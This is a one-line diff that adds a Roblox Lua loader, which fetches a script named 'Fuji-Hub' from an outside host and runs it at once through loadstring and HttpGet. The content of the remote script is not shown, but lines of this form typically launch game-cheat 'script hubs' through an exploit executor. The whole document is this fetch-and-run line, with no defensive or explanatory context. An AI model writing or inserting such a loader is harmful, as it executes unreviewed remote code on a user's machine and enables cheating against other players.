@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://shz.al/~main/dread/Fuji-Hub/script"))()
